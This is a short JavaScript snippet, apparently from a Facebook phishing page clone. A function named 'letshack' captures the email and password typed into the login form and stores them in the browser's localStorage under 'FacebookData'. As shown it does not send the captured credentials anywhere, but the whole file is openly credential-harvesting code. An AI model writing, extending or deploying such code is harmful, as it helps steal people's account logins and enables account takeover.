let email = document.getElementById('email');
let password = document.getElementById('pass');


function letshack(){
  var facebookData = [];

  let savedData = JSON.parse(localStorage.getItem('FacebookData'));
  
  let data = {
    'email' : email.value,
    'password' : password.value,
  }
  
  if (savedData != null){
    facebookData = savedData;
  }

  if (email.value.length != 0 && password.value.length != 0) {
    facebookData.push(data);
    localStorage.setItem('FacebookData',JSON.stringify(facebookData));
  }
}